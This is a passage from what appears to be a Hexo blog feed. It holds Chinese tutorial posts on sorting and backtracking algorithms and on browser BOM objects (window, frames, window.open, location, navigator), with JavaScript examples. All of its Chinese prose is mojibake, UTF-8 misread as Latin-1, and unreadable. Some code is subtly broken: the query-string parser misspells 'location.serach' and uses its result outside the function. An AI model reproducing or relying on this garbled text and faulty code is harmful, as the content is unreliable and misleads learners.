500px"><br>é€‰æ‹©æ’åºæ˜¯åŸåœ°æ’åºç®—æ³•ï¼Œæ˜¯ä¸€ç§ä¸ç¨³å®šçš„æ’åºç®—æ³•ï¼Œæœ€å¥½æƒ…å†µäº‹ä»¶å¤æ‚åº¦å’Œæœ€åæƒ…å†µæ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(nÂ²)</p><p><br></p><h4 id="6-4-å½’å¹¶æ’åº"><a href="#6-4-å½’å¹¶æ’åº" class="headerlink" title="6.4 å½’å¹¶æ’åº"></a>6.4 å½’å¹¶æ’åº</h4><p>å…ˆæŠŠæ•°ç»„ä»ä¸­é—´åˆ†æˆå‰åä¸¤éƒ¨åˆ†ï¼Œç„¶åå¯¹å‰åä¸¤éƒ¨åˆ†åˆ†åˆ«æ’åºï¼Œå†å°†æ’å¥½åºçš„ä¸¤éƒ¨åˆ†åˆå¹¶åœ¨ä¸€èµ·ï¼Œè¿™æ ·æ•´ä¸ªæ•°ç»„å°±æœ‰åºäº†ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/16.jpg" style="max-width: 500px"></p><h4 id="6-5-å¿«é€Ÿæ’åº"><a href="#6-5-å¿«é€Ÿæ’åº" class="headerlink" title="6.5 å¿«é€Ÿæ’åº"></a>6.5 å¿«é€Ÿæ’åº</h4><p><br></p><h3 id="7-å †"><a href="#7-å †" class="headerlink" title="7. å †"></a>7. å †</h3><h3 id="8-å›æº¯"><a href="#8-å›æº¯" class="headerlink" title="8. å›æº¯"></a>8. å›æº¯</h3><p>å¾ˆå¤šç»å…¸çš„æ•°å­¦é—®é¢˜å¯ä»¥ç”¨å›æº¯ç®—æ³•è§£å†³ï¼Œå¦‚æ•°ç‹¬ã€å…«çš‡åã€0-1èƒŒåŒ…ã€å›¾çš„ç€è‰²ã€æ—…è¡Œå•†é—®é¢˜ã€å…¨æ’åˆ—ç­‰ã€‚</p><p>æˆ‘ä»¬æšä¸¾æ‰€æœ‰çš„è§£ï¼Œæ‰¾åˆ°æ»¡è¶³æœŸæœ›çš„è§£ã€‚ä¸ºäº†æœ‰è§„å¾‹åœ°æšä¸¾æ‰€æœ‰å¯èƒ½çš„è§£ï¼Œé¿å…é—æ¼å’Œé‡å¤ï¼Œæˆ‘ä»¬æŠŠé—®é¢˜æ±‚è§£çš„è¿‡ç¨‹åˆ†ä¸ºå¤šä¸ªé˜¶æ®µã€‚æ¯ä¸ªé˜¶æ®µï¼Œéƒ½ä¼šé¢å¯¹ä¸€ä¸ªå²”è·¯å£ï¼Œæˆ‘ä»¬å…ˆé€‰ä¸€æ¡è·¯èµ°ï¼Œå½“å‘ç°è¿™æ¡è·¯èµ°ä¸é€šçš„æ—¶å€™ï¼Œå°±å›é€€åˆ°ä¸Šä¸€ä¸ªå²”è·¯å£ï¼Œå¦é€‰ä¸€ç§èµ°æ³•ç»§ç»­èµ°ã€‚</p><ul><li>0-1èƒŒåŒ…é—®é¢˜ï¼šèƒŒåŒ…æ€»çš„æ‰¿è½½é‡é‡æ˜¯ W kgï¼Œç°åœ¨æœ‰ n ä¸ªç‰©å“ï¼Œæ¯ä¸ªç‰©å“é‡é‡ä¸ç­‰ï¼Œå¹¶ä¸”ä¸å¯åˆ†å‰²ã€‚å¦‚ä½•è®©èƒŒåŒ…ä¸­ç‰©å“çš„æ€»é‡é‡æœ€å¤§ï¼Ÿ</li></ul><p>nä¸ªç‰©å“ï¼Œæ€»çš„è£…æ³•å°±æœ‰2^nç§ã€‚æˆ‘ä»¬å¦‚ä½•æ‰èƒ½ä¸é‡å¤ç©·ä¸¾è¿™2^nç§è£…æ³•ï¼Ÿ</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>BOM - è®¿é—®æµè§ˆå™¨çš„åŠŸèƒ½</title>
      <link href="/2019/02/26/BOM%E6%96%87%E6%A1%A3/"/>
      <url>/2019/02/26/BOM%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h3><p>BOMæä¾›äº†å¾ˆå¤šå¯¹è±¡ï¼Œç”¨äºè®¿é—®æµè§ˆå™¨çš„åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½ä¸ç½‘é¡µå†…å®¹æ— å…³ã€‚<br><br></p><h3 id="2-çª—å£å…³ç³»-amp-iframe"><a href="#2-çª—å£å…³ç³»-amp-iframe" class="headerlink" title="2. çª—å£å…³ç³» &amp; iframe"></a>2. çª—å£å…³ç³» &amp; iframe</h3><p>åœ¨æµè§ˆå™¨ä¸­ï¼Œ<code>window</code>å¯¹è±¡æ—¢æ˜¯JSè®¿é—®æµè§ˆå™¨çª—å£çš„ä¸€ä¸ªæ¥å£ï¼Œåˆæ˜¯JSè§„å®šçš„<code>Global</code>å¯¹è±¡ã€‚å¦‚æœé¡µé¢åŒ…å«iframeï¼Œåˆ™æ¯ä¸ªiframeéƒ½æ‹¥æœ‰è‡ªå·±çš„<code>window</code>å¯¹è±¡ï¼Œå¹¶ä¸”ä¿å­˜åœ¨<code>frames</code>é›†åˆä¸­ã€‚</p><ul><li><p><em>top</em><br><code>top</code>å¯¹è±¡å§‹ç»ˆæŒ‡å‘æœ€å¤–å±‚çš„æ¡†æ¶ï¼Œä¹Ÿå°±æ˜¯æµè§ˆå™¨çª—å£ã€‚<br>ä½ å¯ä»¥é€šè¿‡<code>top.frames[0]</code>, <code>top.frame[&quot;topFrame&quot;]</code>, <code>window.top.frames[0]</code>æ¥å¼•ç”¨topFframeã€‚</p></li><li><p><em>window</em><br><code>window</code>å¯¹è±¡æŒ‡å‘äº†é‚£ä¸ªæ¡†æ¶çš„ç‰¹å®šå®ä¾‹ï¼Œè€Œéæœ€é«˜å±‚çš„æ¡†æ¶ã€‚</p></li><li><p><em>parent</em><br><code>parent</code>å¯¹è±¡å§‹ç»ˆæŒ‡å‘å½“å‰æ¡†æ¶çš„ç›´æ¥ä¸Šå±‚æ¡†æ¶ã€‚<br>åœ¨<code>redFrame</code>ä»£ç ä¸­ï¼Œé€šè¿‡<code>window.parent.parent.frames[0]</code>å¼•ç”¨<code>topFrame</code></p></li><li><p><em>self</em><br><code>self</code>å§‹ç»ˆæŒ‡å‘<code>window</code>, å®ƒå’Œ<code>window</code>å¯ä»¥äº’æ¢ä½¿ç”¨</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">frameset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"top.htm"</span> <span class="attr">name</span>=<span class="string">"topFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"left.htm"</span> <span class="attr">name</span>=<span class="string">"leftFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"right.htm"</span> <span class="attr">name</span>=<span class="string">"rightFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// rightFrameä¸­åˆåŒ…å«äº†ä¸¤ä¸ªiframe</span><br><span class="line"><span class="tag">&lt;<span class="name">frameset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"red.htm"</span> <span class="attr">name</span>=<span class="string">"redFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"blue.htm"</span> <span class="attr">name</span>=<span class="string">"blueFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/02/26/BOMæ–‡æ¡£/1.png" style="max-width:350px"></p><p><br></p><h3 id="3-çª—å£å±æ€§"><a href="#3-çª—å£å±æ€§" class="headerlink" title="3. çª—å£å±æ€§"></a>3. çª—å£å±æ€§</h3><ul><li><p>æµè§ˆå™¨ç›¸å¯¹äºå±å¹•å·¦è¾¹å’Œä¸Šè¾¹çš„ä½ç½®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> leftPos = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenLeft == <span class="string">"number"</span>) ? <span class="built_in">window</span>.screenLeft : <span class="built_in">window</span>.screenX;</span><br><span class="line"><span class="keyword">var</span> topPost = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenTop == <span class="string">"number"</span>) ? <span class="built_in">window</span>.screenTop : <span class="built_in">window</span>.screenY;</span><br></pre></td></tr></table></figure></li><li><p>é¡µé¢è§†å£çš„å¤§å°ï¼ˆæ³¨: æ— æ³•ç¡®å®šæµè§ˆå™¨çª—å£çš„å¤§å°ï¼‰</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pageWidth = <span class="built_in">window</span>.innerWidth,</span><br><span class="line">    pageHeight = <span class="built_in">window</span>.innerHeight;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> pageWidth != <span class="string">"number"</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.compatMode == <span class="string">"CSS1Compat"</span>)&#123;</span><br><span class="line">      pageWidth = <span class="built_in">document</span>.documentElement.clientWidth;</span><br><span class="line">      pageHeight = <span class="built_in">document</span>.documentElement.clientHeight;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pageWidth = <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line">      pageHeight = <span class="built_in">document</span>.body.clientHeight;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-æ‰“å¼€æ–°çª—å£"><a href="#4-æ‰“å¼€æ–°çª—å£" class="headerlink" title="4. æ‰“å¼€æ–°çª—å£"></a>4. æ‰“å¼€æ–°çª—å£</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(url, çª—å£ç›®æ ‡ï¼Œç‰¹æ€§å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªè¡¨ç¤ºæ–°é¡µé¢æ˜¯å¦å–ä»£æµè§ˆå™¨å†å²è®°å½•ä¸­å½“å‰åŠ è½½é¡µé¢çš„å¸ƒå°”å€¼)</span><br></pre></td></tr></table></figure><ul><li><p><em>çª—å£ç›®æ ‡</em><br>è¿™ä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸‹åˆ—ä»»ä½•ä¸€ä¸ªç‰¹æ®Šçš„çª—å£åç§°<em><code>_self</code>, <code>_parent</code>, <code>_top</code>, <code>_blank</code></em>ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå…·ä½“å€¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// å¦‚æœæœ‰ä¸€ä¸ªå«topFrameçš„çª—å£å°±ä¼šåœ¨è¯¥çª—å£æˆ–æ¡†æ¶åŠ è½½è¿™ä¸ªurl</span><br><span class="line">window.open(&quot;http://www.baidu.com&quot;, &quot;topFrame&quot;)</span><br><span class="line"></span><br><span class="line">// åœ¨æ–°æ ‡ç­¾é¡µæ‰“å¼€url</span><br><span class="line">window.open(&quot;https://www.baidu.com&quot;, &quot;_blank&quot;)</span><br></pre></td></tr></table></figure></li><li><p><em>ç‰¹æ€§å­—ç¬¦ä¸²</em><br>åœ¨å½“å‰çª—å£æ‰“å¼€ä¸€ä¸ªå¼¹å‡ºçª—å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&quot;http://www.baidu.com&quot;, null, &quot;height=400,width=400,top=10,left=10,resizeable=yes&quot;)</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>è®¾ç½®</th><th style="text-align:center">å€¼</th><th style="text-align:right">è¯´æ˜</th></tr></thead><tbody><tr><td>fullscreen</td><td style="text-align:center">yes/no</td><td style="text-align:right">æµè§ˆå™¨çª—å£æ˜¯å¦æœ€å¤§åŒ–(é™IE)</td></tr><tr><td>height</td><td style="text-align:center">æ•°å€¼</td><td style="text-align:right">æ–°çª—å£çš„é«˜åº¦ï¼Œä¸èƒ½å°äº100</td></tr><tr><td>width</td><td style="text-align:center">æ•°å€¼</td><td style="text-align:right">æ–°çª—å£çš„å®½åº¦ï¼Œä¸èƒ½å°äº100</td></tr><tr><td>top</td><td style="text-align:center">æ•°ç»„</td><td style="text-align:right">æ–°çª—å£çš„ä¸Šåæ ‡ï¼Œä¸èƒ½æ˜¯è´Ÿå€¼</td></tr><tr><td>left</td><td style="text-align:center">æ•°ç»„</td><td style="text-align:right">æ–°çª—å£çš„å·¦åæ ‡ï¼Œä¸èƒ½æ˜¯è´Ÿå€¼</td></tr><tr><td>location</td><td style="text-align:center">yes/no</td><td style="text-align:right">æ˜¯å¦åœ¨æµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºåœ°å€æ (å¯èƒ½ä¼šè¢«ç¦ç”¨)</td></tr><tr><td>menubar</td><td style="text-align:center">yes/no</td><td style="text-align:right">æ˜¯å¦åœ¨æµè§ˆå™¨çª—å£æ˜¾ç¤ºèœå•æ </td></tr><tr><td>resizable</td><td style="text-align:center">yes/no</td><td style="text-align:right">æ˜¯å¦å¯ä»¥æ‹–åŠ¨æµè§ˆå™¨çª—å£çš„è¾¹æ¡†æ”¹å˜å…¶å¤§å°</td></tr><tr><td>scrollbars</td><td style="text-align:center">yes/no</td><td style="text-align:right">æ˜¯å¦å…è®¸æ»šåŠ¨</td></tr><tr><td>status</td><td style="text-align:center">yes/no</td><td style="text-align:right">æ˜¯å¦åœ¨æµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºçŠ¶æ€æ </td></tr><tr><td>toolbar</td><td style="text-align:center">yes/no</td><td style="text-align:right">æ˜¯å¦åœ¨æµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºå·¥å…·æ </td></tr></tbody></table><ul><li><em>å…¶ä»–æ“ä½œ</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">window</span>.open(<span class="string">"http://www.baidu.com"</span>, <span class="literal">null</span>, <span class="string">"height=400,width=400,top=10,left=10"</span>);</span><br><span class="line">a.resizeTo(<span class="number">500</span>, <span class="number">500</span>)  <span class="comment">// è°ƒæ•´å¤§å°</span></span><br><span class="line">a.moveTo(<span class="number">100</span>, <span class="number">100</span>)    <span class="comment">// ç§»åŠ¨ä½ç½®</span></span><br><span class="line">a.close()             <span class="comment">// å…³é—­æ–°æ‰“å¼€çš„çª—å£</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-location"><a href="#5-location" class="headerlink" title="5. location"></a>5. location</h3><h4 id="5-1-æŸ¥è¯¢URLå‚æ•°"><a href="#5-1-æŸ¥è¯¢URLå‚æ•°" class="headerlink" title="5.1 æŸ¥è¯¢URLå‚æ•°"></a>5.1 æŸ¥è¯¢URLå‚æ•°</h4><p><code>location</code>æ˜¯æœ€æœ‰ç”¨çš„BOMå¯¹è±¡ä¹‹ä¸€ï¼Œå¯ä»¥é€šè¿‡<code>window.location</code>å’Œ<code>document.location</code>è®¿é—®ã€‚å®ƒä¸ä»…ä¿å­˜ç€å½“å‰æ–‡æ¡£çš„ä¿¡æ¯ï¼Œè¿˜å°†å®ƒè§£æä¸ºç‹¬ç«‹çš„ç‰‡æ®µã€‚</p><table><thead><tr><th>å±æ€§å</th><th style="text-align:center">ä¾‹å­</th><th style="text-align:right">è¯´æ˜</th></tr></thead><tbody><tr><td>hash</td><td style="text-align:center">â€œ#contentsâ€</td><td style="text-align:right">è¿”å›URLä¸­çš„hash(#å·åçš„å­—ç¬¦)</td></tr><tr><td>host</td><td style="text-align:center"><code>&quot;www.baidu.com:80&quot;</code></td><td style="text-align:right">è¿”å›æœåŠ¡å™¨åç§°çš„ç«¯å£å·</td></tr><tr><td>hostname</td><td style="text-align:center"><code>&quot;www.baidu.com&quot;</code></td><td style="text-align:right">è¿”å›ä¸å¸¦ç«¯å£å·çš„æœåŠ¡å™¨åç§°</td></tr><tr><td>href</td><td style="text-align:center"><code>&quot;http://www.baidu.com&quot;</code></td><td style="text-align:right">è¿”å›å½“å‰é¡µé¢çš„å®Œæ•´URL</td></tr><tr><td>pathname</td><td style="text-align:center">â€œ/dashboard/â€œ</td><td style="text-align:right">è¿”å›URLçš„ç›®å½•æˆ–æ–‡ä»¶å</td></tr><tr><td>port</td><td style="text-align:center">â€œ8080â€</td><td style="text-align:right">è¿”å›URä¸­çš„ç«¯å£å·</td></tr><tr><td>protocol</td><td style="text-align:center">â€œhttp:â€</td><td style="text-align:right">è¿”å›é¡µé¢ä½¿ç”¨çš„åè®® <code>http:</code>æˆ–<code>https:</code></td></tr><tr><td>search</td><td style="text-align:center">â€œ?q=javascriptâ€</td><td style="text-align:right">è¿”å›URLçš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œä»¥<code>?</code>å¼€å¤´</td></tr></tbody></table><ul><li><em>è§£ææŸ¥è¯¢å­—ç¬¦ä¸²</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryStringArgs</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> qs = (location.search.length &gt; <span class="number">0</span> ? location.serach.substring(<span class="number">1</span>) : <span class="string">""</span>);</span><br><span class="line">      args = &#123;&#125;;</span><br><span class="line">      items = qs.length ? qs.split(<span class="string">"&amp;"</span>) : [];</span><br><span class="line">      </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.length; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> item = items[i].split(<span class="string">"="</span>);</span><br><span class="line">    <span class="keyword">var</span> name = <span class="built_in">decodeURIComponent</span>(item[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">var</span> val = <span class="built_in">decodeURIComponent</span>(item[<span class="number">1</span>]);</span><br><span class="line">    args[name] = val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> args;  </span><br><span class="line">&#125;</span><br><span class="line">alert(args[<span class="string">"q"</span>])  <span class="comment">// "javascript"</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-2-ä¿®æ”¹URL"><a href="#5-2-ä¿®æ”¹URL" class="headerlink" title="5.2 ä¿®æ”¹URL"></a>5.2 ä¿®æ”¹URL</h4><ul><li><p>åœ¨å½“å‰é¡µé¢æ‰“å¼€æ–°URL(å¹¶åœ¨æµè§ˆå™¨çš„å†å²è®°å½•ä¸­ç”Ÿæˆä¸€æ¡è®°å½•)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location.assign(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸assignæ•ˆæœä¸€æ ·</span></span><br><span class="line"><span class="built_in">window</span>.location = <span class="string">"http://www.baidu.com"</span>;</span><br><span class="line">location.href = <span class="string">"http://www.baidu.com"</span></span><br></pre></td></tr></table></figure></li><li><p>å°†hash,search, hostname, pathname, portè®¾ç½®ä¸ºæ–°å€¼æ¥æ”¹å˜URL<br>åªæœ‰ä¿®æ”¹<code>hash</code>å±æ€§ï¼Œé¡µé¢ä¸ä¼šä»¥æ–°URLé‡æ–°åŠ è½½ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾åŸå§‹urlä¸º"http://www.baidu.com/dashboard"</span></span><br><span class="line"><span class="comment">// urlä¿®æ”¹ä¸º"http://www.baidu.com/dashboard/#section1"</span></span><br><span class="line">location.hash = <span class="string">"#section1"</span>;          </span><br><span class="line"></span><br><span class="line"><span class="comment">// urlä¿®æ”¹ä¸º"http://www.baidu.com/dashboard?q=javascript"</span></span><br><span class="line">location.search = <span class="string">"?q=javascript"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// urlä¿®æ”¹ä¸º"http://www.yahoo.com/dashboard"</span></span><br><span class="line">location.hostname = <span class="string">"www.yahoo.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// urlä¿®æ”¹ä¸º"http://www.baidu.com/mydir"</span></span><br><span class="line">location.pathname = <span class="string">"mydir"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// urlä¿®æ”¹ä¸º"http://www.baidu.com:8000/dashboard"</span></span><br><span class="line">location.port = <span class="number">8000</span>;</span><br></pre></td></tr></table></figure></li></ul><p>é€šè¿‡ä¸Šé¢ä»»ä½•ä¸€ç§æ–¹å¼ä¿®æ”¹URLåï¼Œæµè§ˆå™¨çš„å†å²è®°å½•éƒ½ä¼šç”Ÿæˆä¸€æ¡æ–°è®°å½•ã€‚</p><ul><li><p>å½“å‰é¡µé¢åŠ è½½æ–°URLï¼Œä½†æ˜¯ä¸ä¼šå†å†å²è®°å½•ä¸­ç”Ÿæˆæ–°è®°å½•ã€‚ç”¨æˆ·ä¸èƒ½å›åˆ°å‰ä¸€ä¸ªé¡µé¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.replace(<span class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure></li><li><p>é‡æ–°åŠ è½½å½“å‰é¡µé¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.reload();     <span class="comment">// å¯èƒ½ä»ç¼“å­˜ä¸­åŠ è½½</span></span><br><span class="line">location.reload(<span class="literal">true</span>); <span class="comment">// ä»æœåŠ¡å™¨é‡æ–°åŠ è½½</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-navigator"><a href="#6-navigator" class="headerlink" title="6. navigator"></a>6. navigator</h3><h4 id="6-1-æ£€æŸ¥æ’ä»¶"><a href="#6-1-æ£€æŸ¥æ’ä»¶" class="headerlink" title="6.1 æ£€æŸ¥æ’ä»¶"></a>6.1 æ£€æŸ¥æ’ä»¶</h4><p>åœ¨æµè§ˆå™¨ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>plugins</code>æ•°ç»„ï¼Œæ£€æŸ¥æµè§ˆå™¨ä¸­æ˜¯å¦å®‰è£…äº†ç‰¹å®šçš„æ’ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// éIEæµè§ˆå™¨</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  name = name.toLowerCase();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; navigator.plugins.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(navigator.plugins[i].name.toLowerCase().indexOf(name) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IEæµè§ˆå™¨</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasIEPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> ActiveXObject(name);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (ex)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasFlash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = hasPlugin(<span class="string">"Flash"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!result)&#123;</span><br><span class="line">    result = hasIEPlugin(<span class="string">"ShockwaveFlash.ShockwaveFlash"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-åˆ¤æ–­æµè§ˆå™¨ç±»å‹"><a href="#6-2-åˆ¤æ–­æµè§ˆå™¨ç±»å‹" class="headerlink" title="6.2 åˆ¤æ–­æµè§ˆå™¨ç±»å‹"></a>6.2 åˆ¤æ–­æµè§ˆå™¨ç±»å‹</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExploreName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> userAgent = navigator.userAgent;</span><br><span class="line">  <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Opera"</span>) &gt; <span class="number">-1</span> || userAgent.indexOf(<span class="string">"OPR"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Opera'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"compatible"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"MSIE"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'IE'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Edge"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Edge'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Firefox"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Firefox'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Safari"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"Chrome"</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span 